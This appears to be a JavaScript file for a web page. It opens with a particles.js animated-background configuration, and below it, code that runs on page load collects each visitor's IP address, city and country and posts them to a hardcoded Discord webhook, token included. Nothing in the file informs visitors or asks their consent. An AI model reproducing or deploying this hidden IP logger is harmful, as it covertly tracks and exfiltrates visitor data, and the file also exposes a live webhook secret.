// Configuración de partículas
particlesJS("particles-js", {
    particles: {
        number: {
            value: 100,
            density: {
                enable: true,
                value_area: 800
            }
        },
        color: {
            value: "#00FF00"
        },
        shape: {
            type: "circle",
            stroke: {
                width: 0,
                color: "#000"
            }
        },
        opacity: {
            value: 0.5,
            random: false,
            anim: {
                enable: true,
                speed: 1,
                opacity_min: 0.1,
                sync: false
            }
        },
        size: {
            value: 5,
            random: true,
            anim: {
                enable: true,
                speed: 3,
                size_min: 0.1,
                sync: false
            }
        },
        move: {
            enable: true,
            speed: 3,
            direction: "none",
            random: false,
            straight: false,
            out_mode: "out",
            bounce: false,
            attract: {
                enable: false
            }
        }
    },
    interactivity: {
        detect_on: "window",
        events: {
            onhover: {
                enable: true,
                mode: "repulse"
            },
            onclick: {
                enable: true,
                mode: "push"
            }
        }
    }
});

// Función para obtener la IP del usuario
async function getUserData() {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
}

// Función para obtener ciudad y país
async function getLocationData(ip) {
    const res = await fetch(`https://ip-api.com/json/${ip}?fields=city,country,email`);
    const data = await res.json();
    return data;
}

// Función para enviar datos al webhook de Discord
async function sendWebhook(userData) {
    const webhookUrl = "https://discord.com/api/webhooks/1325964921938116619/-Xyo8xmmD2CCY6V3s8RyzmNe1INHKWNOz0S-o7-3jek-xD8aJ1433Qg518t90gzePUjo"; // Reemplaza con tu webhook

    const embed = {
        username: "Webhook Bot",
        embeds: [
            {
                title: "Nuevo Conexión",
                color: 3066993,
                fields: [
                    { name: "IP", value: userData.ip, inline: true },
                    { name: "Ciudad", value: userData.city, inline: true },
                    { name: "País", value: userData.country, inline: true },
                    { name: "Correo", value: userData.email || "Desconocido", inline: true }
                ]
            }
        ]
    };

    const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embed)
    });
}

// Ejecutar el proceso
async function init() {
    const ip = await getUserData();
    const location = await getLocationData(ip);
    const userData = { ...location, ip };
    await sendWebhook(userData);
}

init();
